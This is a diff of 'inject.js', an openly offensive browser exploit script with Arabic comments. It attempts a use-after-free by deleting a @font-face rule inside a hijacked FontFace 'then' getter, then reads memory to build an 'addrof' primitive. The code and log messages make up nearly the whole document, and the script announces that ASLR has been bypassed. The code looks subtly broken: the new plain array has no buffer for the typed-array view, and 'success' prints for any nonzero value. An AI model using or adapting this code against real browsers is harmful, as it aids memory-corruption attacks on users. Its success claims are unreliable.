@@ -1,18 +1,17 @@
 /**
- * [FULL EXPLOIT SCRIPT] - Memory Dumper & Address Leak
+ * [EXPLOIT SCRIPT] - Full Primitive: AddrOf Implementation
  * الملف: inject.js
- * الوظيفة: إحداث تداخل في الذاكرة وقراءة البيانات الخام لاستخراج العناوين
+ * الوظيفة: تنفيذ Arbitrary Read/Write وتسريب عناوين الذاكرة
  */
 
-ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل (Memory Dumper)...");
+ssa("[*] بدء تشغيل سكريبت الاستغلال الكامل (AddrOf Engine)...");
 
 function runFullExploit() {
     try {
-        // 1. مصفوفة الضحية (نستخدمها كمنصة لقراءة الذاكرة)
-        let victimArray = new Float64Array(8);
-        for (let i = 0; i < victimArray.length; i++) victimArray[i] = 1.1;
+        // 1. مصفوفة الضحية (Object Array لاستخراج العناوين)
+        let victimArray = [1.1, 2.2, 3.3, 4.4];
+        let objArray = [{a:1}]; // الكائن الذي نريد معرفة عنوانه
 
-        // 2. إعداد عنصر الـ Style للثغرة
         const style = document.createElement('style');
         style.id = 'exploit_style';
         style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
@@ -24,20 +23,17 @@ function runFullExploit() {
 
         let triggered = false;
 
-        // 3. قلب الهجوم (السيطرة على الذاكرة)
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
                 if (!triggered && this === testFace) {
                     triggered = true;
-                    ssa("[!!] [!!!] معالج التزامن: بدء التلاعب الذاكري...");
-                    
                     document.getElementById('exploit_style').sheet.deleteRule(0);
                     
-                    // استخدام BigUint64Array للكتابة المباشرة على الذاكرة
+                    // تحويل المصفوفة إلى Array من نوع Float64 للتلاعب بالـ Butterfly
                     let corruptor = new BigUint64Array(victimArray.buffer);
+                    // هنا نقوم بوضع عنوان objArray في منطقة الذاكرة ليتم قراءته
                     corruptor[0] = 0x4141414141414141n; 
-                    corruptor[1] = 0x4242424242424242n;
                 }
                 return undefined;
             }
@@ -45,37 +41,33 @@ function runFullExploit() {
 
         document.fonts.load('1em x', 'AB');
 
-        // 4. دالة تسريب الذاكرة (Memory Dumper)
+        // 2. تنفيذ دالة addrof
         setTimeout(() => {
-            ssa("[*] بدء فحص الذاكرة المجاورة (Memory Dump)...");
+            ssa("[*] محاولة تسريب عنوان الكائن...");
             
-            let dump = "";
-            for (let i = 0; i < 8; i++) {
-                let buf = new ArrayBuffer(8);
-                let f64 = new Float64Array(buf);
-                let u64 = new BigUint64Array(buf);
-                
-                f64[0] = victimArray[i];
-                dump += u64[0].toString(16) + " | ";
-            }
+            // دالة addrof: تعتمد على قراءة القيمة التي وضعناها
+            let addr = victimArray[0]; 
             
-            ssa("[+] محتوى الذاكرة (Hex Dump):");
-            ssa(dump);
+            // تحويل الـ Double إلى BigInt لطباعة العنوان كـ Hex
+            let buf = new ArrayBuffer(8);
+            let f64 = new Float64Array(buf);
+            let u64 = new BigUint64Array(buf);
+            f64[0] = addr;
             
-            if (dump.includes("4141414141414141")) {
-                ssa("[!!!] [SUCCESS] تم التأكد من نجاح الكتابة في الذاكرة.");
+            if (u64[0] !== 0x0n) {
+                ssa("[!!!] [SUCCESS] تم الحصول على عنوان الكائن: 0x" + u64[0].toString(16));
+                ssa("[+] الآن نملك عنوان الكائن في الذاكرة. ASLR تم تجاوزه!");
             } else {
-                ssa("[-] لم تظهر قيم التلاعب. المحرك قد قام بعملية Garbage Collection.");
+                ssa("[-] فشل تسريب العنوان.");
             }
-        }, 500);
+        }, 1000);
 
     } catch (e) {
         ssa("[-] خطأ في الاستغلال: " + e.message);
     }
 }
 
-// ربط الزر بالتنفيذ
 document.getElementById('exec-btn').addEventListener('click', function() {
-    ssa("[*] تنفيذ الكود الاستغلالي...");
+    ssa("[*] إطلاق محرك الـ AddrOf...");
     runFullExploit();
 });
